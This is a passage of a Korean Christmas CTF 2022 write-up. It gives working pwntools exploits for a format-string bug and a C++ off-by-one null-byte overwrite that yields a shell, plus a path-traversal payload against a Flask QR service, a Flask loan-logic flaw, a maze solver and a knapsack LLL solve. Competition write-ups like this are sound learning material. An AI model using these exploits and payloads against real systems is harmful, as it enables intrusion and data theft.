        if ( !strncmp((const char *)ptr, s2, 7uLL) )
        {
          printf("Name : ");
          fflush(stdout);
          v3 = v16;
          __isoc99_scanf("%8s", v16);
          if ( v26 > 7 )
          {
            v4 = "Kind list full";
            puts("Kind list full");
          }
          else
          {
            v3 = v16;
            v4 = &v20[16 * v26];
            strcpy(v4, v16);
            ++v26;
          }
        }
        else
        {
          printf(s2);
          v4 = " is Wrong password!";
          puts(" is Wrong password!");
        }
      }
    }
  }
  v25 = 0;
  v9 = "wyv3rn";
  if ( !strcmp(v20, "wyv3rn") )
  {
    for ( i = 0; i <= 5; ++i )
    {
      v9 = &src[i];
      if ( !strcmp(&dest[i], v9) )
      {
        puts("Wyv3rn : My name is still remain on the naughty kid list!");
        exit(0);
      }
    }
    puts("\nWyv3rn : You did it!");
    puts("Wyv3rn : Here is flag!");
    flag("Wyv3rn : Here is flag!", v9, v10, v11, v12, v13);
    exit(0);
  }
  puts("Wyv3rn : My name is not on the kind kid list!");
  exit(0);
}
```

main함수를 보면 8byte짜리 작은 fsb를 주는걸 볼 수 있다. 일단 저 fsb로 패스워드를 릭해야되는데 offset맞추기 귀찮아서

```python
from pwn import *

#context.log_level = "debug"

sla = lambda x, y : r.sendlineafter(x, y)
sa = lambda x, y : r.sendafter(x, y)
rvu = lambda x : r.recvuntil(x)
rv = lambda x : r.recv(x)
rvl = lambda : r.recvline()

#r = process("./kind_kid_list")
r = remote("host1.dreamhack.games", 9141)

offset = 1
for i in range(0x100):
    sla(">> ", "2")
    sla("Password : ", f"%{offset}$p")
    print(rvl()+(str(offset).encode()))
    offset += 1

r.interactive()
```

대충 이렇게 오프셋 싹다 찍어보는거 짜준다음에 패스워드 들어있는 힙주소 나오는 오프셋 찾아서 써줬다.

```c
if ( !strcmp(v20, "wyv3rn") )
{
  for ( i = 0; i <= 5; ++i )
  {
    v9 = &src[i];
    if ( !strcmp(&dest[i], v9) )
    {
      puts("Wyv3rn : My name is still remain on the naughty kid list!");
      exit(0);
    }
  }
  puts("\nWyv3rn : You did it!");
  puts("Wyv3rn : Here is flag!");
  flag("Wyv3rn : Here is flag!", v9, v10, v11, v12, v13);
  exit(0);
}
```

플래그 주는 부분 보면 패스워드 맞추고 첫번째로 입력한 이름이 wyv3rn이어야 하고 그다음 조건에는 src[i]랑 dest[i]랑 문자열이 항상 달라야 한다.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2027.png)

하지만 처음에 strcpy로 같은 값으로 세팅해줘서 일반적인 상황에서는 마지막 for문에서 걸려서 플래그를 못따게 된다. 그래서 조금 고민하다가 fsb로 저 두개중에 하나를 덮어서 값을 다르게 만들자는 생각을 했고 stack leak딴다음에 패스워드 맞추면 이름 입력하는 기능 이용해서 스택에 덮으려는 주소 넣어줬고 패스워드 힙주소 offset알아낼때 썼던 코드 그대로 써서 offset을 쉽게 알아냈다.

```python
from pwn import *

#context.log_level = "debug"

sla = lambda x, y : r.sendlineafter(x, y)
sa = lambda x, y : r.sendafter(x, y)
rvu = lambda x : r.recvuntil(x)
rv = lambda x : r.recv(x)
rvl = lambda : r.recvline()

#r = process("./kind_kid_list")
r = remote("host1.dreamhack.games", 9141)

'''offset = 1
for i in range(0x100):
    sla(">> ", "2")
    sla("Password : ", f"%{offset}$p")
    print(rvl()+(str(offset).encode()))
    offset += 1'''

sla(">> ", "2")
sla("Password : ", "%31$s")

pw = rv(7)

sla(">> ", "2")
sla("Password : ", "%42$p")

stack_leak = int(rv(14), 16)
aaw = stack_leak - 0x1d8
log.info(hex(aaw))

sla(">> ", "2")
sla("Password : ", pw)
sla("Name", "wyv3rn")

for i in range(6):
    sla(">> ", "2")
    sla("Password : ", pw)
    sla("Name", p64(aaw))

sla(">> ", "2")
sla("Password : ", "%14$ln")

sla(">> ", "3")

r.interactive()
```

위 익스플로잇으로 플래그를 얻어낼 수 있다.

<br><br><br>

# R - Santa is lost

미로의 형태가 길이 유일한 트리 형태이고, 좌우, 상하가 역연산 관계이기 때문에 어떤 경로를 가더라도 목표한 1023, 1023에 도달하면 원하는 값을 얻을 수 있다. 

미로 필승전략 오른쪽 벽 타기, 고급지게 표현하면 DFS 그래프 탐색을 이용해서 1023, 1023에 도달할 수 있다. 

ex.py

```python
from pwn import *

p = process("./prob")

f = open("state.txt", "w")
flag = open("flag.txt", "w")

block = b"\xe2\x97\xbd"
santa = b"\xf0\x9f\x8e\x85"

x = 0
y = 0
wall_d = 2 # right: 0, up: 1, left: 2, down: 3

def restate(cmd):
	global x, y
	p.send(cmd)
	if cmd == "w":
		y -= 1
	if cmd == "a":
		x -= 1
	if cmd == "s":
		y += 1
	if cmd == "d":
		x += 1

	f.write(f"x: {x}, y: {y}, wall: {wall_d}\n")

	state = []
	p.recvline()
	for _ in range(15):
		line = p.recvline()
		state_line = []

		while line[:1] != b'\n':
			if line[:3] == block:
				state_line.append(1)
				line = line[3:]
			elif line[:4] == santa:
				state_line.append(2)
				line = line[4:]
			elif line[:2] == b"  ":
				state_line.append(0)
				line = line[2:]
			else:
				break

		assert len(state_line) == 28
		state.append(state_line)
	p.recvline()
	state.append(p.recvline().decode())
	'''
	for i in range(16):
		f.write(str(state[i]) + "\n")
	f.write("\n")
	'''

	if x == 1023 and y == 1023:
		flag.write(state[15])
		exit()

	return state

#santa: 8, 15

state = restate("")

while 1:
	# f.write(f"wall: {wall_d}\n")
	# f.write(f"x: {x}, y: {y}\n")

	assert state[8][15] == 2

	if wall_d == 0:
		assert state[8][16] == 1

		if state[7][15] == 1:
			wall_d = 1

		elif state[6][16] == 1:
			state = restate("w")

		elif state[7][17] == 1:
			state = restate("w")
			state = restate("d")
			wall_d = 3

		else:
			state = restate("w")
			state = restate("d")
			state = restate("s")
			wall_d = 2

	elif wall_d == 1:
		assert state[7][15] == 1

		if state[8][14] == 1:
			wall_d = 2

		elif state[7][13] == 1:
			state = restate("a")

		elif state[6][14] == 1:
			state = restate("a")
			state = restate("w")
			wall_d = 0

		else:
			state = restate("a")
			state = restate("w")
			state = restate("d")
			wall_d = 3

	elif wall_d == 2:
		assert state[8][14] == 1

		if state[9][15] == 1:
			wall_d = 3

		elif state[10][14] == 1:
			state = restate("s")

		elif state[9][13] == 1:
			state = restate("s")
			state = restate("a")
			wall_d = 1

		else:
			state = restate("s")
			state = restate("a")
			state = restate("w")
			wall_d = 0

	else:
		assert state[9][15] == 1

		if state[8][16] == 1:
			wall_d = 0

		elif state[9][17] == 1:
			state = restate("d")

		elif state[10][16] == 1:
			state = restate("d")
			state = restate("s")
			wall_d = 2

		else:
			state = restate("d")
			state = restate("s")
			state = restate("a")
			wall_d = 1
```

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2028.png)

flag

```
DH{Thx for helping Santa Claus!}
```

<br><br><br>

# S - **out of money**

```python
from flask import Flask, session, redirect, url_for, request, render_template
from threading import Thread
from util import get_price, deposit, liquidate

app = Flask(__name__)
app.secret_key = "[REDACTED]"

@app.route("/", methods=['GET', 'POST'])
def main():
    if request.method == 'POST' and request.form['name'] != "":
        session['name'] = request.form['name']

        session['DHH'] = 0.0
        session['DHC'] = 0.0
        session['DHD'] = 0.0

        session['debt_DHH'] = 0.0

        session['col_DHC'] = 0.0
        session['depo_DHC'] = 0.0
        session['depo_DHD'] = 0.0
        session['debt_DHD'] = 0.0

        return redirect(url_for('main'))

    if 'name' in session:
        return render_template("lobby.html", session=session)
    else:
        return render_template("login.html")

@app.route("/santa", methods=['GET', 'POST'])
def santa():
    return render_template("santa.html", session=session, message="")

@app.route("/santa/lend", methods=['POST'])
def santa_lend():
    value = float(request.form['value'])

    if session['debt_DHH'] + value >= 10000.0:
        return render_template("santa.html", session=session, message="그만 빌려욧!")
    if session['DHH'] + value < 0.0:
        return render_template("santa.html", session=session, message="더 갚으시게요...?")

    session['DHH'] += value
    session['debt_DHH'] += value
    return render_template("santa.html", session=session, message="대출완료!")

@app.route("/santa/flag", methods=['GET'])
def santa_flag():
    if session['DHH'] >= 1000.0:
        if session['debt_DHH'] == 0.0:
            return render_template("flag.html")
        else:
            return render_template("santa.html", session=session, message="빚을 먼저 값으세욧!")
    return render_template("santa.html", session=session, message="드핵코인이 없어욧!")

@app.route("/santa/change", methods=['POST'])
def santa_change():
    frm = int(request.form['from'])
    to = int(request.form['to'])
    value = float(request.form['value'])

    if value < 0:
        return render_template("santa.html", session=session, message="어디서 음수만큼 바꾸려고!")

    tbl = ['DHH', 'DHC', 'DHD']
    if frm in [0, 1, 2] and to in [0, 1, 2]:
        frm = tbl[frm]
        to = tbl[to]

        if session[frm] < value:
            return render_template("santa.html", session=session, message="가지고 있는 코인이 그만큼 없어욧!")

        if frm != to:
            frm_price = get_price(frm)
            to_price = get_price(to)

            to_balance = value * frm_price / to_price

            session[frm] -= value
            session[to] += to_balance
        return render_template("santa.html", session=session, message="교환 완료!")
    return render_template("santa.html", session=session, message="다른건 교환 못합니다!")

@app.route("/dream", methods=['GET'])
def dream():
    return render_template("dream.html", session=session, message="")

@app.route("/dream/collateral", methods=['POST'])
def dream_col():
    value = float(request.form['value'])

    if value < 0:
        if session['debt_DHD'] == 0.0:
            session['DHC'] += session['col_DHC']
            session['col_DHC'] = 0.0
            return render_template("dream.html", session=session, message="담보 반환 완료!")
        else:
            return render_template("dream.html", session=session, message="빚을 먼저 값으세욧!")
    if session['DHC'] - value < 0.0:
        return render_template("dream.html", session=session, message="가지고 있는 드냥코인이 부족합니다!")

    session['DHC'] -= value
    session['col_DHC'] += value
    return render_template("dream.html", session=session, message="담보 확인!")

@app.route("/dream/deposit", methods=['POST'])
def dream_deposit():
    type = int(request.form['type'])
    value = float(request.form['value'])

    if type not in [0, 1]:
        return render_template("dream.html", session=session, message="드핵코인, 드냥코인만 예금할 수 있습니다!")

    tbl = ['DHC', 'DHD']
    type = tbl[type]
    if session[type] - value < 0:
        return render_template("dream.html", session=session, message="가지고 있는 코인이 부족합니다!")
    if session["depo_" + type] + value < 0:
        return render_template("dream.html", session=session, message="에금한 코인보다 더 뺄수는 없습니다!")
    session[type] -= value
    session["depo_" + type] += value
    deposit(type, value)
    return render_template("dream.html", session=session, message="예금완료")

@app.route("/dream/lend", methods=['POST'])
def dream_loan():
    value = float(request.form['value'])

    dhc_price = get_price('DHC')
    dhd_price = get_price('DHD')

    max_lend = session['col_DHC'] * dhc_price / dhd_price * 0.8

    print(max_lend)

    if session['DHD'] + value < 0.0:
        return render_template("dream.html", session=session, message="더 갚으시게요...?")
    if max_lend < value:
        return render_template("dream.html", session=session, message="그만큼 빌리기에는 담보가 부족합니다!")

    session['DHD'] += value
    session['debt_DHD'] += value

    return render_template("dream.html", session=session, message="대출 완료!")

@app.route("/logout")
def logout():
    session.pop('name', None)
    return redirect(url_for('main'))

import time
def loop_liquid():
    while True:
        time.sleep(2)
        liquidate()

if __name__ == '__main__':
    t1 = Thread(target = loop_liquid, daemon=True)
    t1.start()
    app.run(host="0.0.0.0")
```

이 문제도 소스코드 분석 제대로 안하고 감으로 풀었다. 일단 대출의 종류에는 무담보 대출과 담보 대출 두가지가 있는데 대출한 돈으로 플래그 구매하면 안되니까 플래그 구매할때 값을 빚이 있는지 검증한다. 근데 코드 보면 무담보 대출에 대해서만 검증하고 담보 대출은 검증하는 코드가 없다. 담보대출은 몇번 테스트 해보니까 대출 횟수에는 제한이 없는거 같길래 처음에는 무담보대출로 100정도 빼온다음 담보로 몰빵해주고 담보대출 계속 하면서 돈복사하고 무담보대출 다 값은다음 플래그 샀다.

<br><br><br>

# U - **Wish List**

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2029.png)

먼저 input함수를 보면 size+1을 해서 입력받는다. 뒤에 널바이트때문에 저렇게 해준거같은데 저렇게 처리해버리면 널바이트가 버퍼를 벗어나서 써져서 바로 뒤에 다른 포인터와 같은 값들이 존재할경우 1byte가 NULL로 덮일 위험성이 존재하게 된다. win함수가 있으므로 aaw한번만 하면 된다.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2030.png)

show_wishlist함수를 보면 name에 아무런 값이 없으면 set_name을 부르는걸 볼 수 있다.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2031.png)

set_name에서는 취약한 함수인 input함수로 name을 설정해준다. 저 name변수는 어디서 나오는거냐면

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2032.png)

바로 여기있는 name이다. 클래스의 멤버함수니까 name에 직접적으로 접근이 가능한거다. 그리고 name바로 밑에 vector가 있는걸 볼 수 있다. 우리가 넣다뺐다 할 수 있는 벡터이다. 설마설마하고 테스트 해봤는데 vector주소의 하위 1바이트가 NULL로 덮이면서 show로 리스트 보려하면 vector가 이상하게 꼬이면서 터졌다. 먼저 2개 insert하고 나서 덮으니까 안터졌다. NULL로 덮어서 vector주소 바꾼다음 delete를 3번 해서 처음 insert한애를 시작점까지 땡겨주면 vector주소를 원하는대로 줄 수 있게 된다. 원하는대로 줘서 insert하면 aaw가 되고 show로 읽으면 aar이 된다. 처음에는 libc leak을 하고 free hook을 덮으려했지만 aar이나 aaw중 하나만 한번 할 수 있는 상황밖에 안나와서 꽤 고민을 많이 했다.

결국 많은 삽질과 고민을 하다가 leak을 하지 말고 바이너리 내의 writeable한 영역중에서 덮을만한 곳을 찾아보자는 쪽으로 결론을 냈는데

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2033.png)

got에 있어야 할법한 함수포인터가 writeable한 영역에 있었다. 저 함수는 어떨때 불리는 함수인지 구글링해보니까 try cache와 같이 exception을 처리할때 불린다고 한다. 윈도우의 SEH와 비슷한 개념 같다. 아무튼 여기를 win함수로 덮고

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2034.png)

delete할때 try catch블록을 사용하니까 try에서 일부러 에러나게끔 인덱스를 -1로 줬더니 셸이 따였다.

```python
from pwn import *

#context.log_level = "debug"

sla = lambda x, y : r.sendlineafter(x, y)
sa = lambda x, y : r.sendafter(x, y)
s = lambda x : r.send(x)
rvu = lambda x : r.recvuntil(x)
rv = lambda x : r.recv(x)

#r = process("./prob", stdout=PTY, stdin=PTY)
r = remote("host3.dreamhack.games", 10202)

def add(data):
    sla("> ", "1")
    sla("> ", data)

def delete(idx):
    sla("> ", "3")
    sla("> ", str(idx))
    sla(">", "y")

win = 0x4034DA

add(p64(0)+p64(0x407000)+p64(0x407000+0x20))
add(b"a"*0x18)
sla("> ", "2")
sla("Your Name", b"\x00"*0x10)

delete(3)
delete(3)
delete(2)

add(p64(win)*3)
add(p64(0x407010)*3)

sla("> ", "3")
sla("> ", "-1")

r.interactive()
```

최종 익스플로잇은 위와 같다.

<br><br><br>

# V - santa’s sack

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2035.png)

cryptohack에 있는 문제와 숫자 하나의 변경도 없이 동일한 문제이다. 

1/2을 넣어서 더해져서 0이 되는 다른 쌍들의 가능성을 배제하고 LLL을 실행해주면 된다. 

ex.sage

```python
from Crypto.Util.number import *

pubkey = 생략
enc = 생략

l = len(pubkey)

matrix = []

for i in range(l):
	line = [0] * (l + 1)
	line[l] = pubkey[i]
	line[i] = 1
	matrix.append(line)

line = [1 / 2] * l + [enc]
matrix.append(line)

M = Matrix(matrix)
M = M.LLL()
for line in M:
	if line[l] == 0:
		fail = 0
		for i in range(l):
			if line[i] != 1 / 2 and line[i] != -1 / 2:
				fail = 1
				break

		if fail == 0:
			val = 0
			for i in range(l):
				if line[i] == -1 / 2:
					val |= (1 << i)

			print(long_to_bytes(val))
```

flag

```
DH{M3rry_chri5tm4s_h0~h0~h0~}
```

<br><br><br>

# W - **QR Online**

```python
#!/usr/bin/env python3
import base64
import glob
import os
import shutil
from urllib.parse import urlparse, parse_qs

import qrcode
from flask import Flask, abort, render_template, request, session

with open('./flag.txt', 'r') as f:
    FLAG = f.read()

app = Flask(__name__)
app.secret_key = os.urandom(32)

class CacheMiss(Exception):
    pass

def normalize_scheme(scheme):
    return scheme + '.'

def normalize_host(host):
    return host

def normalize_path(path):
    return path.replace('/', '.')

def normalize_params(params):
    return '.' + params

def normalize_query(query):
    q = parse_qs(query.replace('/', '.'))
    qs = ''
    for k, v in q.items():
        qs += k + '=' + v[-1] + '&'
    if len(qs) != 0:
        qs = qs[:-1]
    return qs

def normalize_fragment(fragment):
    return fragment

def normalize(url):
    p = urlparse(url)
    norm_url = normalize_scheme(p.scheme)
    norm_url += normalize_host(p.netloc)
    norm_url += normalize_path(p.path)
    norm_url += normalize_params(p.params)
    norm_url += normalize_query(p.query)
    norm_url += normalize_fragment(p.fragment)
    return norm_url

def get_cache(norm_url):
    cache = glob.glob('static/cache/' + norm_url)
    if len(cache) != 1:
        raise CacheMiss('Cache Miss!')
    return cache[0]

@app.before_request
def init_session():
    if session:
        return
    session['id'] = os.urandom(32).hex()
    os.mkdir('static/users/' + session['id'])

@app.route('/', methods=['GET'])
def index():
    return render_template('index.html')

@app.route('/qr_generator', methods=['GET', 'POST'])
def qr_generator():
    if request.method == 'GET':
        return render_template('qr_generator.html')

    # POST
    url = request.form.get('url')
    if not isinstance(url, str):
        abort(400)

    try:
        norm_url = normalize(url)
        cache = get_cache(norm_url)
        # Cache Hit
        dst = 'static/users/' + session['id'] + '/qr_code.png'
        shutil.copyfile(cache, dst)

    except CacheMiss:
        img = qrcode.make(url)
        src = f'static/cache/{norm_url}'
        img.save(src)
        dst = 'static/users/' + session['id'] + '/qr_code.png'
        shutil.copyfile(src, dst)

    except:
        abort(500)

    finally:
        if url.startswith('http://') or url.startswith('https://'):
            with open(dst, 'rb') as f:
                img_data = base64.b64encode(f.read()).decode('utf-8')
            return f'<img src="data:image/png;base64,{img_data}">'

        return 'url must starts with "http://" or "https://".'

@app.route('/qr_reader', methods=['GET', 'POST'])
def qr_reader():
    if request.method == 'GET':
        return render_template('qr_reader.html')

    # POST
    return 'in maintenance.. 👷'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

app.py의 소스코드는 이렇다. 처음에는 문제 이름만 보고 qrcode모듈의 CVE를 활용하는 문제인줄 알았는데 내 생각보다 훨씬 쉬웠다. url을 filename으로 바꿔주는 부분을 보면 다른데는 대부분 /가 .으로 치환되지만 fragment에선 그대로 반환해줘서 원하는 페이로드 주입이 가능하다. get_cache에서 static/users/에다가 가공된 url붙여서 존재하는 파일인지 체크해주는데 여기서 LFI로 flag.txt의 내용을 'static/users/' + session['id'] + '/qr_code.png'에다가 적을 수 있다. 하지만 앞에 [http://](http://를) 를 붙이면 LFI를 못하기 때문에 파일에 옮겨 적기만 하고 if문에 걸려서 이미지를 볼수는 없다. 그래도 다 방법이 있었다. //#/../../../../../app/flag.txt를 주면 일단 내용은 적을 수 있다.

flask의 session은 flask-unsign으로 디코딩할 수 있다. 따라서 디코딩해서 session[’id’]값을 알아낼 수 있고 qr_code.png파일의 전체 경로를 알 수 있다. /static이니까 url상에서 직접 접근할 수 있다.

최종 익스는 먼저 url을 //#/../../../../../app/flag.txt로 줘서 png파일에 플래그 내용 저장한다음에 /static/users/random(32)/qr_code.png을 요청하고 다른 이름으로 저장 누르면 플래그가 적힌 파일이 다운받아진다.